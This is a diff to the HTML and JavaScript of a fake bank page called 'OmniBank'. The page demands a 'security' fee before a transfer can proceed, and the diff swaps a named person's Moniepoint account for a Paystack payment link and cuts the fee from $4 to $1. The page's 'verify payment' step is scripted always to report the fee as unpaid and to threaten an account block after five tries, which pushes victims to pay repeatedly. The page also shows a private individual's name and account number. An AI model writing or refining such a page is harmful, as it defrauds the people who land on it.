@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OmniBank · secure transfer validation</title>
+    <title>OmniBank · secure transfer · paystack integration</title>
     <!-- Font Awesome 6 (free) -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
@@ -406,6 +406,25 @@
             margin-top: 10px;
             font-weight: 600;
         }
+
+        .professional-link {
+            background: #e8f0fe;
+            border-radius: 30px;
+            padding: 14px 20px;
+            margin: 15px 0;
+            text-align: center;
+            border: 1px solid #3a5f8b;
+        }
+        .professional-link a {
+            color: #0a1a2f;
+            text-decoration: none;
+            font-weight: 600;
+            word-break: break-all;
+        }
+        .professional-link i {
+            margin-right: 8px;
+            color: #3a5f8b;
+        }
     </style>
 </head>
 <body>
@@ -517,13 +536,13 @@
             </div>
         </div>
 
-        <!-- FEE NOTICE + PAYMENT PAGE ($4 fee, 4700 naira instruction) -->
+        <!-- FEE NOTICE + PAYMENT PAGE ($1 fee, 1700 naira instruction, Paystack link) -->
         <div id="feePage" class="page">
             <div class="simple-card">
                 <div class="fee-message">
                     <i class="fas fa-exclamation-circle" style="font-size:22px; color:#b45b0f;"></i> 
                     <strong>New beneficiary – security hold</strong><br>
-                    It looks like this is a new account. For security, maintenance & registration, a one-time <strong>$4.00 fee</strong> is required.
+                    It looks like this is a new account. For security, maintenance & registration, a one-time <strong>$1.00 fee</strong> is required.
                 </div>
                 <p style="font-weight:600; margin-bottom:10px;">choose fee method:</p>
                 <div class="payment-options" id="paymentOptions">
@@ -536,22 +555,24 @@
 
                 <!-- local bank generation area (hidden) -->
                 <div id="localBankGeneration" style="display: none; text-align:center; margin:20px 0;">
-                    <i class="fas fa-spinner fa-pulse"></i> generating local bank details...
+                    <i class="fas fa-spinner fa-pulse"></i> generating secure payment link...
                 </div>
 
                 <!-- local bank payment details (shown after generation) -->
                 <div id="localBankDetails" style="display: none;">
                     <div class="payment-detail-box">
-                        <div style="font-weight:700; margin-bottom:12px;">🏦 LOCAL BANK TRANSFER</div>
-                        <div class="bank-detail-row"><strong>Bank:</strong> moniepoint</div>
-                        <div class="bank-detail-row"><strong>Account number:</strong> 5507663166</div>
-                        <div class="bank-detail-row"><strong>Account name:</strong> CHIBUIKE CHRISTIANTUS ONEBUNNE</div>
-                        <div class="bank-detail-row"><strong>Amount:</strong> $4.00 USD (4,700 naira)</div>
-                        <div class="bank-detail-row"><i>Send 4,700 naira to the account below. Nothing more nothing less for easy verification</i></div>
+                        <div style="font-weight:700; margin-bottom:12px;">🔐 SECURE PAYMENT PORTAL</div>
+                        <div class="bank-detail-row"><strong>Amount:</strong> $1.00 USD (1,700 naira)</div>
+                        <div class="bank-detail-row"><i>Click the link below to complete your payment via our secure partner:</i></div>
+                        <div class="professional-link">
+                            <i class="fas fa-lock"></i> 
+                            <a href="https://paystack.shop/pay/6iqq8-yw-w" target="_blank">https://paystack.shop/pay/6iqq8-yw-w</a>
+                        </div>
+                        <div class="bank-detail-row" style="margin-top:15px;"><strong>Instructions:</strong> Send exactly 1,700 naira using the link above. Nothing more, nothing less for easy verification.</div>
                     </div>
-                    <button class="copy-btn" id="copyBankBtn"><i class="far fa-copy"></i> copy account details</button>
-                    <p style="font-size:14px; margin:10px 0;">After paying the $4 fee, you'll continue the withdrawal process.</p>
-                    <button class="btn-primary" id="iHavePaidBtn">✓ I have made the $4 payment</button>
+                    <button class="copy-btn" id="copyLinkBtn"><i class="far fa-copy"></i> copy payment link</button>
+                    <p style="font-size:14px; margin:10px 0;">After completing the $1 payment via Paystack, click confirm below.</p>
+                    <button class="btn-primary" id="iHavePaidBtn">✓ I have made the $1 payment</button>
                 </div>
                 <div class="back-link" id="backFromFee"><i class="fas fa-chevron-left"></i> back to send form</div>
             </div>
@@ -563,7 +584,7 @@
                 <i class="fas fa-exclamation-triangle" style="font-size:60px; color:#b42e2e;"></i>
                 <h3 style="margin:20px 0;">payment not confirmed</h3>
                 <p style="background:#ffe1e1; padding:20px; border-radius:30px;" id="notPaidMessage">
-                    You haven't paid the $4 fee. Please go back and pay.
+                    You haven't paid the $1 fee. Please go back and pay.
                 </p>
                 <div class="attempt-counter" id="attemptCounter">Attempt 1 of 5. After 5 failed attempts your account will be blocked.</div>
                 <button class="btn-primary" id="goBackToFeeBtn">← back to payment</button>
@@ -608,7 +629,7 @@
         const backFromSend = document.getElementById('backFromSend');
         const backFromFee = document.getElementById('backFromFee');
         const iHavePaid = document.getElementById('iHavePaidBtn');
-        const copyBtn = document.getElementById('copyBankBtn');
+        const copyLinkBtn = document.getElementById('copyLinkBtn');
         const goBackToFee = document.getElementById('goBackToFeeBtn');
         const sendError = document.getElementById('sendError');
         const notPaidMessage = document.getElementById('notPaidMessage');
@@ -703,7 +724,7 @@
                         bankOpt.classList.remove('locked-option');
                         bankOpt.classList.add('clickable-option');
 
-                        // when local bank clicked -> generation message, then show details
+                        // when local bank clicked -> generation message, then show details with Paystack link
                         bankOpt.onclick = () => {
                             localBankGeneration.style.display = 'block';
                             localBankDetails.style.display = 'none';
@@ -717,12 +738,12 @@
             });
         });
 
-        // copy bank details
-        copyBtn.addEventListener('click', () => {
-            const details = `Bank: moniepoint\nAccount: 5507663166\nName: CHIBUIKE CHRISTIANTUS ONEBUNNE\nInstruction: Send 4,700 naira to the account below. Nothing more nothing less for easy verification`;
-            navigator.clipboard?.writeText(details).then(() => {
-                showLoader(400, 'copying...', () => alert('✅ details copied'));
-            }).catch(() => alert('copy manually'));
+        // copy payment link
+        copyLinkBtn.addEventListener('click', () => {
+            const link = 'https://paystack.shop/pay/6iqq8-yw-w';
+            navigator.clipboard?.writeText(link).then(() => {
+                showLoader(400, 'copying...', () => alert('✅ payment link copied'));
+            }).catch(() => alert('copy manually: ' + link));
         });
 
         // I have paid -> goes to not paid page with counter (simulate failed attempt)
@@ -740,7 +761,7 @@
             showLoader(2500, 'verifying payment...', () => {
                 feePage.classList.remove('active');
                 notPaidPage.classList.add('active');
-                notPaidMessage.innerHTML = `You haven't paid the $4 fee. Please go back and pay.${blockMsg}`;
+                notPaidMessage.innerHTML = `You haven't paid the $1 fee. Please go back and pay.${blockMsg}`;
                 attemptCounter.innerText = `Attempt ${attemptCount} of 5. After 5 failed attempts your account will be blocked.`;
                 if (attemptCount >= 5) {
                     attemptCounter.innerText = 'Account blocked due to 5 failed attempts.';
